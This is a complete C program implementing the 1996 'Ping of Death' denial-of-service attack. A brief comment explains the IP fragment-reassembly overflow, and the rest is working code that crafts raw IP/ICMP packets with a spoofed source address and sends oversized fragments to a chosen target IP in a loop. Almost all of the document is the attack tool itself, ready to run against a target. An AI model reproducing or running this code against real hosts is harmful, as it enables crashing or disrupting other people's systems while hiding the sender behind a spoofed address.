/*
Implementation of the PING OF DEATH DoS attack discovered in 1996
Afflicting several systems including Windows 95

How to use:

./pod [spoofed_source_ip] [target_ip] [number_of_retries]

How it works:

IP fragmentation can lead vulnerable systems to buffer overflows when
attempting to reconstruct fragmented IP packets

The Fragment_offset field in the IP header indicates where the payload of the 
current fragment needs to be positioned in order to reconstruct the original large payload

This field however can represent a maximum offset of 65528 while the maximum length of an IP
packet can be 65535. The maximum payload size for a fragment with offset 65528 would therefore be
only 7 bytes, but vulnerable systems do not perform this check and end up reconstructing the payload
from the fragments they receive. This payload ends up overflowing the buffer utilized and can create
freezes and crashes

This implementation overflows the target system for 405 bytes

*/


#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <strings.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define PAYLOAD_SIZE 420
#define IP_HEADER_LEN 20
#define ICMP_HEADER_LEN 8
/*
calculated by [floor(65528 / payload_size)] * payload_size + payload_size
*/
#define FINAL_PACKET_SIZE 65940 

struct icmp_packet{
    unsigned char type;
    unsigned char code;
    unsigned short checksum;
    unsigned short ident;
    unsigned short sequence;
    unsigned char data[1];
};

struct ip_packet{
        unsigned char ver_ihl;
        unsigned char service;
        unsigned short len;
        unsigned short ident;
        unsigned short fl_off;
        unsigned char ttl;
        unsigned char proto;
        unsigned short checksum;
        unsigned char src[4];
        unsigned char dest[4];
        unsigned char data[1];
};


unsigned short int checksum(unsigned char* b, int len){
        unsigned short total = 0;
        unsigned short prev = 0;
        unsigned short* p = (unsigned short*)b;

        int i;

        for(i = 0; i < len/2; i++){
                total += ntohs(p[i]);
                if(total < prev)
                        total++;

                prev = total;
        }

        if(i * 2 != len){
                total += htons(p[len/2]) & 0xFF00;
                if(total < prev)
                        total++;
        }

        return (0xFFFF-total);
}

void build_ip_header(struct ip_packet* p, unsigned char ver, unsigned char ihl, unsigned char precedence, 
        unsigned char delay, unsigned char through, unsigned char reliab, unsigned short len, unsigned short ident, 
        unsigned char df, unsigned char mf, unsigned short offset, unsigned char ttl, unsigned char proto, unsigned char* src, unsigned char* dest){
        unsigned char ver_ihl = ver << 4;
        ver_ihl += ihl;
        p->ver_ihl = ver_ihl;

        unsigned char service = precedence << 5;
        if(delay)
                service += 0x10;

        if(through)
                service += 0x08;

        if(reliab)
                service += 0x02;

        p->service = service;
        p->len = htons(len);
        p->ident = htons(ident);
        unsigned short fl_off = 0;
        if(df)
                fl_off += 0x40;

        if(mf)
                fl_off += 0x20;

        fl_off += offset;
        p->fl_off = htons(fl_off);

        p->ttl = ttl;
        p->proto = proto;

        memcpy(&(p->src), src, 4);
        memcpy(&(p->dest), dest, 4);

        p->checksum = 0;

        p->checksum = htons(checksum((unsigned char*)p, ihl * 4));

}

void build_icmp_header(struct icmp_packet* p, unsigned char type, unsigned char code, unsigned short ident, unsigned short sequence, int payload_size){
    p->type = type;
    p->code = code;
    p->ident = htons(ident);
    p->sequence = htons(sequence);
    p->checksum = 0;
    p->checksum = htons(checksum((unsigned char*)p, payload_size + 8));
}

unsigned char target_ip[4];
unsigned char my_ip[4];
struct sockaddr_in dest;
struct sockaddr_in source;
int yes;
int s;
int n;
struct ip_packet* send_ippack;
struct icmp_packet* send_icmp;
unsigned char send_buf[PAYLOAD_SIZE + IP_HEADER_LEN];

int main(int argc, char** argv){
    if(argc != 4){
        printf("Usage: pod [SPOOFED_SOURCE_IP] [TARGET_IP] [N_RETRIES]\n");
        exit(1);
    }    
    inet_pton(AF_INET, argv[1], &(source.sin_addr));
    inet_pton(AF_INET, argv[2], &(dest.sin_addr));
    memcpy(&target_ip[0], &dest.sin_addr.s_addr, 4);
    memcpy(&my_ip[0], &source.sin_addr.s_addr, 4);
    n = atoi(argv[3]);

    printf("Sending Ping of Death to: %d.%d.%d.%d - %d retries\n", target_ip[0], target_ip[1], target_ip[2], target_ip[3], n);

    send_ippack = (struct ip_packet*) &send_buf[0];
    send_icmp = (struct icmp_packet*) &(send_ippack->data[0]);
    s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    dest.sin_family = AF_INET;
    yes = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &yes, sizeof(yes));
    
    build_ip_header(send_ippack, 4, 5, 0, 0, 0, 0, PAYLOAD_SIZE + IP_HEADER_LEN, 0xDEAD, 0, 0, 0, 128, 1, my_ip, target_ip);
    send_ippack -> checksum = 0; //kernel fills up IP checksum... but not ICMP
    bzero(send_icmp, PAYLOAD_SIZE - IP_HEADER_LEN);
    build_icmp_header(send_icmp, 8, 0, 0xDEAD, 0, PAYLOAD_SIZE + ICMP_HEADER_LEN);

    for(int i = 0; i < n; i++){
        int offset;

        for(offset = 0; offset < FINAL_PACKET_SIZE; offset += (PAYLOAD_SIZE)){
            //offset / 8
            send_ippack->fl_off = htons(offset >> 3);
            //if offset + fragment_size still within legal bounds set MORE FRAGMENTS flag
            if (offset < FINAL_PACKET_SIZE - PAYLOAD_SIZE)
                    send_ippack->fl_off |= htons(0x2000);

            send_ippack->checksum = 0;

            if(sendto(s, send_buf, sizeof(send_buf), 0, (struct sockaddr*)&dest, sizeof(dest)) < 0)
                perror("sendto");

            //after sending first packet, no more ICMP Echo header, just send all zeroes
            if(offset == 0)
                bzero(send_icmp, ICMP_HEADER_LEN);

        }

        printf("Sent packet n. %d\n", i);
        usleep(1500000);
    }
    
    close(s);
    return 0;
}
